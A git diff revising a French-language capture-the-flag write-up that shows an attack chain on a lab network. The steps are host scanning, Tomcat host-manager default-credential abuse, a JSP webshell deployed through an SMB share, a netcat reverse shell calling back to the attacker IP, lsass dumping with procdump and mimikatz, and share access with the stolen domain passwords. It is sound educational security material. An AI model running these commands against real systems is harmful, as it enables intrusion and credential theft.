+(KaliVM) ➜ sudo masscan -e tun0 -p22,21,23,80,443,445,139,136,111,U:161,U:162,U:53,1433,3306,53,3389,5432,631 --rate 1000 172.16.42.0/24
 Discovered open port 445/tcp on 172.16.42.5                                    
 Discovered open port 53/tcp on 172.16.42.5                                     
 Discovered open port 445/tcp on 172.16.42.101                                  
 Discovered open port 445/tcp on 172.16.42.11                                   
 ```
 
-Je n'ai pas spécialement confiance au ping scan de nmap, car si l'icmp est bloqué et qu'il n'y a pas de service sur le port 80 et 443, alors l'hôte sera vu comment down. D'où le masscan sur des ports un peu connus. Cette technique révèle 3 IP :
+Avec cette méthode trois machines sont ressorties :
 
 * 172.16.42.5
 * 172.16.42.11
 * 172.16.42.101
 
-C'est le moment pour un port scan. J'ai tendance à d'abord faire un masscan (beaucoup plus rapide que nmap) suivi d'un nmap sur les ports ouverts pour avoir les infos des services exposés.
-
-#### V.1.a. 172.16.42.5
+#### V.1.a. 172.16.42.5 (DC01-WW2)
 
 ```bash
-sudo masscan -e tun0 -p0-65535,U:0-65535 --rate 1000 172.16.42.5 | tee out_mass_5
-
+(KaliVM) ➜ sudo masscan -e tun0 -p0-65535,U:0-65535 --rate 1000 172.16.42.5 | tee out_mass_5
 Discovered open port 49669/tcp on 172.16.42.5                                  
 Discovered open port 445/tcp on 172.16.42.5                                    
 Discovered open port 53/udp on 172.16.42.5                                     
@@ -749,11 +754,10 @@ Discovered open port 593/tcp on 172.16.42.5
 Discovered open port 636/tcp on 172.16.42.5                                    
 Discovered open port 49687/tcp on 172.16.42.5       
 
-cat out_mass_5 | cut -d ' ' -f4 | sed 's/\/.*$//' | tr '\n' ','
+(KaliVM) ➜ cat out_mass_5 | cut -d ' ' -f4 | sed 's/\/.*$//' | tr '\n' ','
 49669,445,53,53,3268,50206,593,636,49687
 
-sudo nmap -sT -sV -O -T4 -vvv --version-intensity=8 -sC -p49669,445,53,53,3268,50206,593,636,49687 172.16.42.5
-
+(KaliVM) ➜ sudo nmap -sT -sV -O -T4 -vvv --version-intensity=8 -sC -p49669,445,53,53,3268,50206,593,636,49687 172.16.42.5
 PORT      STATE SERVICE       REASON  VERSION
 53/tcp    open  domain        syn-ack Microsoft DNS
 445/tcp   open  microsoft-ds? syn-ack
@@ -763,6 +767,12 @@ PORT      STATE SERVICE       REASON  VERSION
 49669/tcp open  ncacn_http    syn-ack Microsoft Windows RPC over HTTP 1.0
 49687/tcp open  msrpc         syn-ack Microsoft Windows RPC
 50206/tcp open  msrpc         syn-ack Microsoft Windows RPC
+
+[...]
+
+TCP Sequence Prediction: Difficulty=253 (Good luck!)
+IP ID Sequence Generation: Incremental
+Service Info: Host: DC01-WW2; OS: Windows; CPE: cpe:/o:microsoft:windows
 
 Host script results:
 | p2p-conficker: 
@@ -780,17 +790,22 @@ Host script results:
 |_  start_date: 1601-01-01 00:09:21
 ```
 
+Cette machine ressemble à un Domain Controller pour plusieurs raisons :
+
+* Le port 53 (DNS), étant une caractéstique d'un AD
+* Le port 3268 (LDAP), mentionnant le domaine __factory.lan__
+* Son nom d'hôte plutôt explicit : __DC01-WW2__
+
+
 #### V.1.b. 172.16.42.11
 
 
 ```bash
-sudo masscan -e tun0 -p0-65535,U:0-65535 --rate 1000 172.16.42.11
-
+(KaliVM) ➜ sudo masscan -e tun0 -p0-65535,U:0-65535 --rate 1000 172.16.42.11
 Discovered open port 8080/tcp on 172.16.42.11          
 Discovered open port 445/tcp on 172.16.42.11     
 
-sudo nmap -sT -sV -O -T4 -vvv --version-intensity=8 -sC -p8080,445 172.16.42.11
-
+(KaliVM) ➜ sudo nmap -sT -sV -O -T4 -vvv --version-intensity=8 -sC -p8080,445 172.16.42.11
 PORT     STATE SERVICE       REASON  VERSION
 445/tcp  open  microsoft-ds? syn-ack
 8080/tcp open  http-proxy    syn-ack
@@ -819,64 +834,79 @@ Host script results:
 |_  start_date: 1601-01-01 00:09:21
 ```
 
+D'intuition cette machine ressemble au point d'entrée que nous cherchons. Les deux premières hypothèses fut :
+
+1. Connexion anonymes sur le share Samba ;
+2. Vulnérabilité et / ou identifiants par défaut sur le serveur 8080, tomcat étant une solution répandue sur ce port.
+
 #### V.1.c. 172.16.42.101
 
 ```bash
-sudo masscan -e tun0 -p0-65535,U:0-65535 --rate 1000 172.16.42.101
-
+(KaliVM) ➜ sudo masscan -e tun0 -p0-65535,U:0-65535 --rate 1000 172.16.42.101
 Discovered open port 135/tcp on 172.16.42.101                                  
 Discovered open port 49712/tcp on 172.16.42.101                                
 Discovered open port 445/tcp on 172.16.42.101                                  
 Discovered open port 5040/tcp on 172.16.42.101                                 
 Discovered open port 49669/tcp on 172.16.42.101                  
 
-sudo nmap -sT -sV -O -T4 -vvv --version-intensity=8 -sC -p135,49712,445,5040,49669 172.16.42.101
-
-PORT      STATE    SERVICE REASON      VERSION
-135/tcp   open     msrpc   syn-ack     Microsoft Windows RPC
-554/tcp   filtered rtsp    no-response
-5040/tcp  open     unknown syn-ack
-49669/tcp open     msrpc   syn-ack     Microsoft Windows RPC
-49712/tcp open     msrpc   syn-ack     Microsoft Windows RPC
+(KaliVM) ➜ sudo nmap -sT -sV -O -T4 -vvv --version-intensity=8 -sC -p135,49712,445,5040,49669 172.16.42.101
+PORT      STATE SERVICE       REASON  VERSION
+135/tcp   open  msrpc         syn-ack Microsoft Windows RPC
+445/tcp   open  microsoft-ds? syn-ack
+5040/tcp  open  unknown       syn-ack
+49669/tcp open  msrpc         syn-ack Microsoft Windows RPC
+49712/tcp open  msrpc         syn-ack Microsoft Windows RPC
 ```
 
-A vu de nez je dirais que la machine en .5 est un domain controller, donc on verra plus tard pour taper dessus. Ensuite les connexions anonymes SMB et RPC n'ont rien données.
+Les trois premiers ports sont suspects et peut lancer penser :
 
-J'ai donc décidé de me tourner vers la machine .11, car il y a le port 8080 qui ressemble à un tomcat.
+1. Connexion anonyme sur le RPC et SMB ;
+2. Un service "unknown" sur le port 5040.
 
-### V.2. Basic enum on 172.16.42.11
+### V.2. Enumération du serveur web
 
-J'ai fait un dirsearch avec une wordlist pour tomcat : https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/tomcat.txt
+Après quelques tentatives infructueuses sur les différents serveurs SMB, il est temps de se concentrer sur le serveur web : `http://172.16.42.11:8080/`.
+
+<center>
+![](/img/writeups/wonkachall2019/step5_index.png)
+_Fig 14_: Index du serveur web
+</center>
+
+En naviguant sur le site, il est possible de retrouver une cartographie du réseau : `http://172.16.42.11:8080/infra.jsp`
+
+<center>
+![](/img/writeups/wonkachall2019/infra.png)
+_Fig 15_: Schéma réseau incomplet
+</center>
+
+L'extension __jsp__ conforte l'idée du serveur tomcat, la page 404 affirme cette idée. L'execution de dirsearch avec une wordlist adaptée retourne des pages intéressantes :
 
 ```bash
-python3 /opt/t/pentest/recona/dirsearch/dirsearch.py -u http://172.16.42.11:8080/ -e .jsp,.html,.do,.action,.txt -w ./tomcat.txt    
-
+(KaliVM) ➜ python3 /opt/t/pentest/recona/dirsearch/dirsearch.py -u http://172.16.42.11:8080/ -e jsp,html,do,action,txt -w ./tomcat.txt    
 [15:08:17] 302 -    0B  - /host-manager  ->  /host-manager/
 [15:08:17] 401 -    2KB - /host-manager/html/%2A
 [15:08:17] 302 -    0B  - /manager  ->  /manager/
 ```
 
-C'est à ce moment que j'ai compris que les gens travaillant chez Akerva sont des petits coquins. Par défaut, quand je tombe sur un tomcat, je vais directement sur la page `/manager` :
+D'ordinaire, la page `manager` est la solution de facilité avec des identifiants par défaut, il suffit de générer un webshell avec l'extension __war__ et de l'uploader. Dans notre cas, cette page est ... Indisponible :
 
+<center>
 ![](/img/writeups/wonkachall2019/step5_manager.png)
-_Fig 13_ : Manager page
+_Fig 16_ : Page manager
+</center>
 
-Mais il y a une autre page : `/host-manager`, une basic authent apparait et il suffit de tester les identifiants par défaut de tomcat :
+Dans les résultats du dirsearch, il y a aussi la page `/host-manager`. Cette page est protégée par une __Basic authentification__, heureusement les identifiants par défaut de Tomcat fonctionnent :
 
 > tomcat : tomcat
 
-En cherchant un peu sur internet, je suis tombé sur un article de Certilience (cf. Ressource 1), il suffit de suivre.
+__Certilience__ a écrit un très bon guide pour cette attaque : https://www.certilience.fr/2019/03/variante-d-exploitation-dun-tomcat-host-manager/
 
-### V.3. Setup the attack
+### V.3. Mise en place de l'exploitation
 
-Il faut d'abord crafter le .war qui va nous permettre d'avoir un webshell. J'ai généré une archive war avec msfvenom puis modifié la charge pour avoir un webshell standard plutôt qu'un meterpreter. 
-
-Il faut savoir qu'une application war est en fait une archive zip, donc il suffit de décompresser l'archive générée avec msfvenom, remplacer le fichier jsp et le web.xml et compresser à nouveau le tout.
-
-On se retrouve avec l'archive suivante :
+N'étant pas un grand fan de Metasploit quand je peux m'en passer, j'ai décidé de récupérer un webshell "standard", plutôt que de générer un meterpreter. Une archive __war__ est simplement une archive zip avec une hiérarchie particulière :
 
 ```bash
-➜ tree .                   
+(KaliVM) ➜ tree .                   
 .
 ├── index.jsp
 ├── META-INF
@@ -885,7 +915,7 @@ On se retrouve avec l'archive suivante :
     └── web.xml
 ```
 
-et le index.jsp contient :
+La charge malveillante se situe dans le fichier __index.jsp__ :
 
 ```jsp
 <FORM METHOD=GET ACTION='index.jsp'>
@@ -909,66 +939,77 @@ InputStreamReader(p.getInputStream()));
 <pre><%=output %></pre>
 ```
 
-Ce webshell vient de : https://github.com/tennc/webshell
+La charge ci-dessus provient du dépôt de __tennc__ : https://github.com/tennc/webshell
 
-Le .war peut être téléchargé ici : https://mega.nz/#!73RCVKDK!EPrPZ_JeWgZc2RWQq2OyErlJUGa-zAjf3fo8LbgtiCs
+L'archive __war__ utilisée lors de l'exploitation peut être téléchargée ici : https://mega.nz/#!73RCVKDK!EPrPZ_JeWgZc2RWQq2OyErlJUGa-zAjf3fo8LbgtiCs
 
-#### V.3.a. New host 
+#### V.3.a. Nouvel hôte
 
-Maintenant, il faut ajouter une entrée dans le `/etc/hosts` pour lier l'ip du web server à un hostname :
+En suivant les indications de __Certilience__, il faut ajouter une entrée dans le fichier `/etc/hosts` de notre machine afin de lier l'IP du serveur tomcat à un hostname :
 
 ```bash
-sudo echo "172.16.42.11	maki-lab" >> /etc/hosts
+(KaliVM) ➜ sudo echo "172.16.42.11	maki-lab" >> /etc/hosts
 ```
+
+Cette étape sera utile lors du déploiement de la nouvelle application via les UNC path.
 
 #### V.3.b. SMB server
 
-Enfin, mettre en place un serveur Samba, impacket fait largement l'affaire :
+Il est impératif de mettre en place un partage samba (__smbserver.py__) pour que le serveur Tomcat puisse récupérer notre application malveillante :
 
 ```bash
-sudo smbserver.py -smb2support data .
+(KaliVM) ➜ sudo smbserver.py -smb2support data .
 ```
 
-Le serveur samba se place dans le dossier courant, il faut pas non plus oublier de mettre notre archive war dans ce dossier pour la déployer.
+La commande ci-dessus ouvre un partage nommé __data__ dans le dossier courant, où se trouve l'archive war.
 
 ### V.4. Exploitation
 
-Aller, maintenant il est temps de déployer notre webshell
+Les préparatifs étant terminés, il est temps de déployer le webshell :
 
+<center>
 ![](/img/writeups/wonkachall2019/step5_hostmanager.png)
-_Fig 14_ : Host-manager page
+_Fig 17_ : Host-manager page
+</center>
 
-Lors du déploiement on voit de l'activité au niveau du serveur SMB. Une fois que cette nouvelle application est déployé, on peut y accéder avec l'url suivante :
+De l'activité est visible sur les logs du serveur SMB lors du déploiement de notre application. On peut finalement accéder à cette application avec l'URL suivante : `http://maki-lab:8080/cmd/index.jsp`
 
-> http://maki-lab:8080/cmd/index.jsp
-
+<center>
 ![](/img/writeups/wonkachall2019/step5_webshell.png)
-_Fig 15_ : Webshell
+_Fig 18_ : Webshell
+</center>
 
-Maintenant il est temps d'avoir un vrai shell. Pour cela il suffit de mettre un netcat dans notre share et l'éxecuter via les UNC path. Mais avant, il faut connaitre la configuration du serveur :
+### V.5. Reverse shell
 
-![](/img/writeups/wonkachall2019/step5_systeminfo.png)
-_Fig 16_ : Systeminfo
+Pour récupérer un shell plus ou moins intéractif, il est possible de déposer le binaire __netcat__ dans le partage __data__, créé pour l'exploitation précédente. Sous Windows, il est possible d'executer des binaires distants grâce aux UNC path.
 
-On voit bien que c'est du 64 bits, donc c'est le moment de faire notre reverse shell :
+#### V.5.a. Terminal 1 - Hôte
 
-```bash
-rlwrap ncat -klvp 12345
-```
-
-Le `rlwrap` sert à utiliser les flèches dans le terminal. Pour déclencher ce reverse shell, je n'ai plus qu'à faire :
+Le binaire `rlwrap` (readline wrapper) sert d'historique de commande mais aussi d'interface entre le clavier local et distant. L'utiliser lors d'un reverse shell permet à l'attaquant de pouvoir utiliser le flèches de son clavier correctement et d'avoir l'historique des commandes de la session :
 
 ```bash
-\\10.8.0.10\data\nc64.exe -e cmd.exe 10.8.0.10 12345
+(KaliVM) ➜ rlwrap ncat -klvp 12345
 ```
 
+#### V.5.b. Application malveillante - Serveur tomcat
+
+L'UNC path ci-dessous va executer le binaire en mémoire sur le serveur tomcat et ainsi établir une connexion sur le port 12345 :
+
+```bash
+(SRV01-INTRANET) ➜ \\10.8.0.10\data\nc64.exe -e cmd.exe 10.8.0.10 12345
+```
+
+<center>
 ![](/img/writeups/wonkachall2019/step5_reverseshell.png)
-_Fig 17_ : Reverse shell
+_Fig 19_ : Reverse shell
+</center>
 
-Maintenant qu'on a un shell plus ou moins interactif et plus ou moins stable, il est temps de récupérer le flag!
+C'est ainsi qu'il est possible de récupérer un accès shell plus ou moins intéractif et plus ou moins stable.
 
+<center>
 ![](/img/writeups/wonkachall2019/step5_flag.png)
-_Fig 18_ : Flag
+_Fig 20_ : Flag
+</center>
 
 ### V.5. Flag
 
@@ -978,7 +1019,12 @@ _Fig 18_ : Flag
 
 ### Resources
 
-1. __Pôle audit de Certilience__, _Variante d’exploitation d’un Apache Tomcat : host manager app vulnérable ?_, Blog de Certilience : https://www.certilience.fr/2019/03/variante-d-exploitation-dun-tomcat-host-manager/
+1. __SecList__, _Discovery Web-content Tomcat_, GitHub : https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/tomcat.txt
+2. __Pôle audit de Certilience__, _Variante d’exploitation d’un Apache Tomcat : host manager app vulnérable ?_, Blog de Certilience : https://www.certilience.fr/2019/03/variante-d-exploitation-dun-tomcat-host-manager/
+3. __Eternallybored__, _Download netcat Windows binaries_; eternallybored.org : https://eternallybored.org/misc/netcat/netcat-win32-1.11.zip
+
+---
+---
 
 ## VI. Step 6 - Mimikatz you said ?
 
@@ -986,53 +1032,58 @@ _Fig 18_ : Flag
 
 ### TL;DR
 
-1. Exécuter `procdump.exe` sur le serveur avec le tomcat
-2. Récupérer le minidump de `lsass.exe`
-3. Récupérer les identifiants stocké dedans avec `mimikatz` en local
-4. Trouver le mot de passe de `adminserver` : `factory.lan\adminServer : #3LLe!!estOuL@Poulette`
+1. Exécuter `procdump.exe` sur le serveur tomcat (SRV01-INTRANET) ;
+2. Récupérer le minidump du processus `lsass.exe` ;
+3. Retrouver les identifiants stocké grâce à `mimikatz` en local : `adminserver` : `factory.lan\adminServer : #3LLe!!estOuL@Poulette`.
 
 ---
 
-### VI.1. State of the art
+### VI.1. Post exploitation
 
-Dans ce challenge, la première idée qui vient est d'utiliser mimikatz. Mais bon, ça aurait été trop simple.
+Lorsqu'un accès privilégié est obtenu sur un serveur, il est naturel d'essayer de récupérer des identifiants (mimikatz pour Windows ou swapdigger pour Linux). En l'occurrence, __Mimikatz__ va chercher les identifiants dans la mémoire du processus de _lsass.exe_. 
 
-L'autre solution pour récupérer des creds dans lsass, est de créer un minidump et de l'analyser avec un mimikatz en local. De toute manière on va avoir besoin d'une machine Windows à un moment donné. Pour ma part, j'utilise Commando VM, c'est un script powershell fait par FireEye pour installer les outils classiques de pentest. Plutot pratique.
+Une autre méthode, plus difficile à détecter pour de potentiels anti virus, consiste à récupérer la mémoire de ce processus grâce à __procdump.exe__. Ce binaire est développé et signé par Microsoft et fait parti des _Windows Sysinternals_. Mimikatz est capable de charger un dump mémoire de ce processus en local et en extraire les identifiants. 
 
 ### VI.2. Getting lsass minidump
 
-Comme je disais précédemment, on va utiliser procdump. C'est un binaire signé et trusté par Microsoft, car il fait parti des SysInternals. J'ai tendance à ne pas vouloir drop des binaires ou modifier la configuration d'une machine cible, donc je préfère l'éxecution en mémoire :
+L'éxecution de __procdump.exe__ se fera comme pour _netcat_ : via les UNC path.
 
 ```bash
-\\10.8.0.10\data\procdump64.exe -ma lsass.exe lsadump
+(SRV01-INTRANET) ➜ \\10.8.0.10\data\procdump64.exe -ma lsass.exe lsadump
 ```
 
+<center>
 ![](/img/writeups/wonkachall2019/step6_procdump.png)
-_Fig 19_ : Getting lsass minidump with procdump
+_Fig 21_ : Récupérer le minidump de lsass.exe
+</center>
 
-Et donc maintenant, histoire de récupérer ce minidump, on peut utiliser Samba à nouveau :
+Toujours avec les UNC path, il est possible de copier des fichiers sur un partage distant :
 
 ```bash
-copy lsadump.dmp \\10.8.0.10\data\lsadump.dmp
+(SRV01-INTRANET) ➜ copy lsadump.dmp \\10.8.0.10\data\lsadump.dmp
 ```
 
+<center>
 ![](/img/writeups/wonkachall2019/step6_smbtransfer.png)
-_Fig 20_ : Bring back the minidump at home
+_Fig 22_ : Copie du minidump vers notre partage
+</center>
 
 Le minidump est disponible ici : https://mega.nz/#!bj4h1ISB!17pQuX17K8gvMRlBZYsuphDtHhYE07G1x-nyT1OPGVY
 
-### VI.3. Getting password
+### VI.3. Récupération des mots de passe dans le minidump
 
-En executant mimikatz dans Commando VM :
+Comme mentionné précédemment, __Mimikatz__ est capable de lire un minidump en local. C'est à ce moment que CommandoVM entre en jeu.
 
 ```bash
-mimikatz # privilege::debug
+(CommandoVM) ➜ .\mimikatz.exe
+
+# privilege::debug
 Privilege '20' OK
 
-mimikatz # sekurlsa::Minidump lsassdump.dmp
+# sekurlsa::Minidump lsassdump.dmp
 Switch to MINIDUMP : 'lsassdump.dmp'
 
-mimikatz # sekurlsa::logonPasswords
+# sekurlsa::logonPasswords
 Opening : 'lsassdump.dmp' file for minidump...
 
 [...]
@@ -1061,11 +1112,9 @@ SID               : S-1-5-18
          * Password : #3LLe!!estOuL@Poulette
 ```
 
-J'ai tronqué un peu la sortie, sinon c'est chiant à lire. On a donc récupérer les identifiants suivants :
+Pour des soucis de lisibilité, la sortie de Mimikatz a été tronquée. Les identifiants récupérés sont :
 
 > factory.lan\adminServer : #3LLe!!estOuL@Poulette
-
-Et maintenant il suffit d'en faire le sha256 pour avoir la flag.
 
 ### VI.4. Flag
 
@@ -1075,10 +1124,12 @@ Et maintenant il suffit d'en faire le sha256 pour avoir la flag.
 
 ### Resources
 
-1. __Sebastien Macke - @lanjelot__, _Dumping Windows Credentials_, securusglobal : https://www.securusglobal.com/community/2013/12/20/dumping-windows-credentials/
-2. __cyberarms__, _Grabbing Passwords from Memory using Procdump and Mimikatz_, cyberarms : https://cyberarms.wordpress.com/2015/03/16/grabbing-passwords-from-memory-using-procdump-and-mimikatz/
-3. __ired.team__, _Credential Access & Dumping_, ired.team : https://ired.team/offensive-security/credential-access-and-credential-dumping
-4. __Mark Russinovich and Andrew Richards__, _ProcDump v9.0_,  Documentation Microsoft : https://docs.microsoft.com/en-us/sysinternals/downloads/procdump
+1. __sevagas__, _swap\_digger_, GitHub : https://github.com/sevagas/swap_digger
+2. __Microsoft__, _Windows Sysinternals_, Documentation Microsoft : https://docs.microsoft.com/en-us/sysinternals/
+3. __Sebastien Macke - @lanjelot__, _Dumping Windows Credentials_, securusglobal : https://www.securusglobal.com/community/2013/12/20/dumping-windows-credentials/
+4. __cyberarms__, _Grabbing Passwords from Memory using Procdump and Mimikatz_, cyberarms : https://cyberarms.wordpress.com/2015/03/16/grabbing-passwords-from-memory-using-procdump-and-mimikatz/
+5. __ired.team__, _Credential Access & Dumping_, ired.team : https://ired.team/offensive-security/credential-access-and-credential-dumping
+6. __Mark Russinovich and Andrew Richards__, _ProcDump v9.0_,  Documentation Microsoft : https://docs.microsoft.com/en-us/sysinternals/downloads/procdump
 
 ## VII. Step 7 - Spreading love
 
@@ -1086,20 +1137,31 @@ Et maintenant il suffit d'en faire le sha256 pour avoir la flag.
 
 ### TL;DR
 
-1. Avec les identifiants récupérer, il suffit de voir à quels shares nous avons accès
-2. Trouver le shares `Users` sur le serveur `172.16.42.5`
-3. Le monter en local et récupérer le flag et d'autres identifiants : `factory.lan\SvcJoinComputerToDom : QueStC3qU!esTpetItEtMarr0N?`
+1. Essayer d'accéder aux partages du réseau avec identifiants récupérés ;
+2. Trouver le partage __Users__ sur le serveur `172.16.42.5` ;
+3. Le parcourir et trouver les identifiants : `factory.lan\SvcJoinComputerToDom : QueStC3qU!esTpetItEtMarr0N?`
 
 ---
 
-### VII.1. State of the art
+### VII.1. Reconnaissance
 
-Maintenant il faut se rappeler les différents scans qu'on a fait jusqu'à présent. Le potentiel DC est le `172.16.42.5`, voyons s'il est possible de se connecter à un share :
+Dans les scans réalisés dans l'étape 5 (cf. V.1. Reconnaissance), toutes les machines ont le port SMB (445/tcp) ouvert. Les connexions anonymes ayant échouées, on peut réitérer les tests avec les identifiants de __adminServer__. 
+
+L'outil __CrackMapExec__ (CME) est pratique lors de tests internes avec de nombreuses machines. Il permet par exemple de lister les partages de toute une plage d'IP :
 
 ```bash
-➜ cme smb 172.16.42.5 -u 'adminServer' -p '#3LLe!!estOuL@Poulette' -d 'factory.lan' --shares
+(KaliVM) ➜ cme smb ./ip_list -u 'adminServer' -p '#3LLe!!estOuL@Poulette' -d 'factory.lan' --shares 
 SMB         172.16.42.5     445    DC01-WW2         [*] Windows 10.0 Build 17763 x64 (name:DC01-WW2) (domain:factory.lan) (signing:True) (SMBv1:False)
+SMB         172.16.42.101   445    PC01-DEV         [*] Windows 10.0 Build 18362 x64 (name:PC01-DEV) (domain:factory.lan) (signing:False) (SMBv1:False)
 SMB         172.16.42.5     445    DC01-WW2         [+] factory.lan\adminServer:#3LLe!!estOuL@Poulette 
+SMB         172.16.42.101   445    PC01-DEV         [+] factory.lan\adminServer:#3LLe!!estOuL@Poulette 
+SMB         172.16.42.101   445    PC01-DEV         [+] Enumerated shares
+SMB         172.16.42.101   445    PC01-DEV         Share           Permissions     Remark
+SMB         172.16.42.101   445    PC01-DEV         -----           -----------     ------
+SMB         172.16.42.101   445    PC01-DEV         ADMIN$                          Remote Admin
+SMB         172.16.42.101   445    PC01-DEV         C$                              Default share
+SMB         172.16.42.101   445    PC01-DEV         IPC$            READ            Remote IPC
+SMB         172.16.42.101   445    PC01-DEV         Users                           
 SMB         172.16.42.5     445    DC01-WW2         [+] Enumerated shares
 SMB         172.16.42.5     445    DC01-WW2         Share           Permissions     Remark
 SMB         172.16.42.5     445    DC01-WW2         -----           -----------     ------
@@ -1109,24 +1171,37 @@ SMB         172.16.42.5     445    DC01-WW2         IPC$            READ        
 SMB         172.16.42.5     445    DC01-WW2         NETLOGON        READ            Logon server share 
 SMB         172.16.42.5     445    DC01-WW2         provisioning    READ            
 SMB         172.16.42.5     445    DC01-WW2         SYSVOL          READ            Logon server share 
-SMB         172.16.42.5     445    DC01-WW2         Users           READ    
+SMB         172.16.42.5     445    DC01-WW2         Users           READ            
 ```
 
-Il y a le share "Users" ! C'est super intéressant ! 
+L'adresse _172.16.42.11_ ne répond pas sur son port SMB. Cependant, un partage __Users__ est accessible en lecture sur _172.16.42.5_ (DC01-WW2).
 
 ### VII.2. Mount Users share
 
-Il ne reste plus qu'à monter le volume distant.
+Il est possible de se connecter au partage via `smbclient` :
 
 ```bash
-➜ mkdir /tmp/a
+(KaliVM) ➜ smbclient -U 'adminServer%#3LLe!!estOuL@Poulette' -W "factory.lan" //172.16.42.5/Users
+WARNING: The "syslog" option is deprecated
+Try "help" to get a list of possible commands.
+smb: \> ls
+  .                                  DR        0  Wed Jun 19 23:00:08 2019
+  ..                                 DR        0  Wed Jun 19 23:00:08 2019
+  Administrator                       D        0  Wed Jun 19 23:00:35 2019
+  Default                           DHR        0  Wed Jun 19 22:52:35 2019
+  desktop.ini                       AHS      174  Sat Sep 15 09:16:48 2018
 
-➜ sudo mount -t cifs -o username=adminServer,password='#3LLe!!estOuL@Poulette' //172.16.42.5/Users a
+		12966143 blocks of size 4096. 9273442 blocks available
+```
 
-➜ ls /tmp/a
+Il est également possible de le monter en local. D'un point de vue personnel je préfère cette méthode, c'est plus simple pour naviguer dans le partage :
+
+```bash
+(KaliVM) ➜ mkdir /tmp/a
+(KaliVM) ➜ sudo mount -t cifs -o username=adminServer,password='#3LLe!!estOuL@Poulette' //172.16.42.5/Users a
+(KaliVM) ➜ ls /tmp/a
 Administrator   Default   desktop.ini
-
-➜  a tree Administrator 
+(KaliVM) ➜ tree Administrator 
 Administrator
 └── Documents
     └── provisioning
